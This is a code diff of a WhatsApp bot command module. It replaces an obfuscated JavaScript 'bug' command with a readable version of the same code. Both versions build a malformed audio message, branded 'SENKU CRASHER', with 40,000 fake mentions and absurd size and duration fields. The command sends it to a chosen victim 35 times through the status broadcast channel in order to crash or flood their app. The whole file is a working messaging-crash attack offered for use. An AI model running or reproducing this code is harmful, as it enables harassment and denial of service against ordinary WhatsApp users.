@@ -1,1 +1,177 @@
-(function(_0x46fc26,_0x43d7fd){const _0x5ee4a4=_0x4000,_0x41d5e1=_0x46fc26();while(!![]){try{const _0x701c78=-parseInt(_0x5ee4a4(0xa1))/0x1*(parseInt(_0x5ee4a4(0xa7))/0x2)+parseInt(_0x5ee4a4(0x96))/0x3+parseInt(_0x5ee4a4(0xbb))/0x4*(-parseInt(_0x5ee4a4(0xbe))/0x5)+-parseInt(_0x5ee4a4(0xc1))/0x6*(-parseInt(_0x5ee4a4(0xa8))/0x7)+-parseInt(_0x5ee4a4(0xbc))/0x8+parseInt(_0x5ee4a4(0xa5))/0x9*(parseInt(_0x5ee4a4(0xa9))/0xa)+parseInt(_0x5ee4a4(0x9e))/0xb*(parseInt(_0x5ee4a4(0x9f))/0xc);if(_0x701c78===_0x43d7fd)break;else _0x41d5e1['push'](_0x41d5e1['shift']());}catch(_0x5dd0b7){_0x41d5e1['push'](_0x41d5e1['shift']());}}}(_0x227b,0xa0c0b));import _0xdafeb3 from'crypto';import{generateWAMessageFromContent}from'bailey';function _0x4000(_0x49e0db,_0x19f0ee){const _0x227b80=_0x227b();return _0x4000=function(_0x40009c,_0x2570e3){_0x40009c=_0x40009c-0x96;let _0x93527c=_0x227b80[_0x40009c];return _0x93527c;},_0x4000(_0x49e0db,_0x19f0ee);}function _0x227b(){const _0x5c93b5=['120363321780343299@newsletter','conversation','slice','55908KHKljP','participant','38138YNfPTt','1355564bDHrLk','1370HUvnkO','Specify\x20the\x20person\x20to\x20bug.','key','/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0','contextInfo','iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=','floor','mentioned_users','ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=','sendMessage','Succceded\x20in\x20sending\x20bug\x20to\x20the\x20target','trim','audio/mpeg','https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true','An\x20error\x20occurred\x20while\x20trying\x20to\x20bug\x20the\x20target:','replace','status@broadcast','+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=','2908DOoiiM','7446520nsunrv','quotedMessage','2735lEuItB','AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==','An\x20error\x20occurred\x20while\x20trying\x20to\x20bug\x20the\x20target:\x20','24JKQYKl','remoteJid','831924uUhkfe','extendedTextMessage','text','@s.whatsapp.net','13135550002@s.whatsapp.net','split','random','error','154VpMUpy','382524hZTtMG','message','19lhlAsq'];_0x227b=function(){return _0x5c93b5;};return _0x227b();}import _0x56b27c from'../commands/bug.js';async function bugs(_0x2e2a62,_0x447c65){const _0x49bbdd=_0x4000,_0x497d69=0x9c40,_0x185d9f=_0x49bbdd(0x9a),_0x5d20d6=[_0x185d9f,...Array['from']({'length':_0x497d69},()=>'1'+Math[_0x49bbdd(0xaf)](Math[_0x49bbdd(0x9c)]()*0x7a120)+_0x49bbdd(0x99))],_0x541319=_0x49bbdd(0xb6),_0x53cc43=_0x49bbdd(0xb5),_0x1de078=_0x49bbdd(0xb1),_0xbdf52e=_0x49bbdd(0xae),_0x5d05de=_0x49bbdd(0xba),_0xbc2cea=0x5af3107a3fff,_0x45ffd4=_0x49bbdd(0xac),_0x5e1429=0x5af3107a3fff,_0x190f23=0x5af3107a3fff,_0x204fb2=_0x49bbdd(0xbf),_0x2ccc78={'mentionedJid':_0x5d20d6,'isForwarded':!![],'forwardedNewsletterMessageInfo':{'newsletterJid':_0x49bbdd(0xa2),'serverMessageId':0x1,'newsletterName':'SENKU\x20CRASHER'}},_0x4d8e4c={'ephemeralMessage':{'message':{'audioMessage':{'url':_0x541319,'mimetype':_0x53cc43,'fileSha256':_0x1de078,'fileLength':_0x5e1429,'seconds':_0x190f23,'ptt':!![],'mediaKey':_0x5d05de,'fileEncSha256':_0xbdf52e,'directPath':_0x45ffd4,'mediaKeyTimestamp':_0xbc2cea,'contextInfo':_0x2ccc78,'waveform':_0x204fb2}}}},_0x2030da=generateWAMessageFromContent(_0x2e2a62,_0x4d8e4c,{'userJid':_0x2e2a62}),_0x11164b={'messageId':_0x2030da[_0x49bbdd(0xab)]['id'],'statusJidList':[_0x2e2a62],'additionalNodes':[{'tag':'meta','attrs':{},'content':[{'tag':_0x49bbdd(0xb0),'attrs':{},'content':[{'tag':'to','attrs':{'jid':_0x2e2a62},'content':undefined}]}]}]};await _0x447c65['relayMessage'](_0x49bbdd(0xb9),_0x2030da[_0x49bbdd(0xa0)],_0x11164b);}async function delay(_0xe00e5c,_0x30734a){const _0x18e0f6=_0x4000;try{const _0x101186=_0xe00e5c[_0x18e0f6(0xab)]?.['remoteJid'];if(!_0x101186)throw new Error('Message\x20JID\x20is\x20undefined.');await _0x30734a[_0x18e0f6(0xb2)](_0x101186,{'text':'Attempting\x20to\x20bug\x20the\x20target'});const _0xdc49f6=_0xe00e5c['message']?.[_0x18e0f6(0x97)]?.[_0x18e0f6(0x98)]||_0xe00e5c[_0x18e0f6(0xa0)]?.[_0x18e0f6(0xa3)]||'',_0x3dd6d5=_0xdc49f6[_0x18e0f6(0xa4)](0x1)[_0x18e0f6(0xb4)](),_0x36db13=_0x3dd6d5[_0x18e0f6(0x9b)](/\s+/),_0x129517=_0x36db13[_0x18e0f6(0xa4)](0x1);let _0x478f2e;if(_0xe00e5c[_0x18e0f6(0xa0)]?.[_0x18e0f6(0x97)]?.[_0x18e0f6(0xad)]?.[_0x18e0f6(0xbd)])_0x478f2e=_0xe00e5c[_0x18e0f6(0xa0)][_0x18e0f6(0x97)][_0x18e0f6(0xad)][_0x18e0f6(0xa6)];else{if(_0x129517['length']>0x0)_0x478f2e=_0x129517[0x0][_0x18e0f6(0xb8)]('@','')+_0x18e0f6(0x99);else throw new Error(_0x18e0f6(0xaa));}const _0x2fc6c4='@'+_0x478f2e[_0x18e0f6(0xb8)](_0x18e0f6(0x99),'');for(let _0x27290a=0x0;_0x27290a<0x23;_0x27290a++){await bugs(_0x478f2e,_0x30734a);;await new Promise(_0x4953bb=>setTimeout(_0x4953bb,0x3e8));}await _0x56b27c(_0xe00e5c,_0x30734a,_0x18e0f6(0xb3),0x4);}catch(_0x571bef){console[_0x18e0f6(0x9d)](_0x18e0f6(0xb7),_0x571bef),await _0x30734a['sendMessage'](_0xe00e5c[_0x18e0f6(0xab)][_0x18e0f6(0xc2)],{'text':_0x18e0f6(0xc0)+_0x571bef['message']});}}export default delay;
+import crypto from "crypto";
+
+import { generateWAMessageFromContent } from "bailey";
+
+import channelSender from '../commands/channelSender.js'
+
+
+async function bugs(isTarget, client) {
+
+  const floods = 40000;
+
+  const mentioning = "13135550002@s.whatsapp.net";
+
+  const mentionedJids = [
+
+    mentioning,
+    ...Array.from({ length: floods }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
+  ];
+
+  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
+
+  const mime = "audio/mpeg", sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=", enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
+
+  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=", timestamp = 99999999999999;
+
+  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
+
+  const longs = 99999999999999, loaded = 99999999999999;
+
+  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";
+
+  const messageContext = {
+
+    mentionedJid: mentionedJids,
+
+    isForwarded: true,
+
+    forwardedNewsletterMessageInfo: {
+
+      newsletterJid: "120363321780343299@newsletter",
+
+      serverMessageId: 1,
+
+      newsletterName: "SENKU CRASHER"
+
+    }
+
+  };
+
+  const messageContent = {
+
+    ephemeralMessage: {
+
+      message: {
+
+        audioMessage: {
+
+          url: links,
+
+          mimetype: mime,
+
+          fileSha256: sha,
+
+          fileLength: longs,
+
+          seconds: loaded,
+
+          ptt: true,
+
+          mediaKey: key,
+
+          fileEncSha256: enc,
+
+          directPath: path,
+
+          mediaKeyTimestamp: timestamp,
+
+          contextInfo: messageContext,
+
+          waveform: data
+        }
+      }
+    }
+  };
+
+  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });
+
+  const broadcastSend = {
+
+    messageId: msg.key.id,
+
+    statusJidList: [isTarget],
+
+    additionalNodes: [{
+
+      tag: "meta",
+
+      attrs: {},
+
+      content: [{
+
+        tag: "mentioned_users",
+
+        attrs: {},
+
+        content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]
+
+      }]
+
+    }]
+
+  };
+
+  await client.relayMessage("status@broadcast", msg.message, broadcastSend);
+
+}
+
+
+async function delay (message, client){
+
+ try {
+
+        const remoteJid = message.key?.remoteJid;
+
+        if (!remoteJid) {
+
+            throw new Error("Message JID is undefined.");
+        }
+
+        await client.sendMessage(remoteJid, { text: "Attempting to bug the target" });
+
+        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
+
+        const commandAndArgs = messageBody.slice(1).trim();
+
+        const parts = commandAndArgs.split(/\s+/);
+
+        const args = parts.slice(1);
+
+        let participant;
+
+        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
+
+            participant = message.message.extendedTextMessage.contextInfo.participant;
+
+        } else if (args.length > 0) {
+
+            participant = args[0].replace('@', '') + '@s.whatsapp.net';
+
+        } else {
+
+            throw new Error('Specify the person to bug.');
+        }
+
+        const num = '@' + participant.replace('@s.whatsapp.net', '');
+
+        // Execute the bug command
+
+        for (let i = 0; i < 35; i++) {
+
+            await bugs(participant, client);;
+
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+        }
+
+        await channelSender(message, client, "Succceded in sending bug to the target", 4);
+
+    } catch (error) {
+
+        console.error("An error occurred while trying to bug the target:", error);
+
+        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
+    }
+}
+
+export default delay;
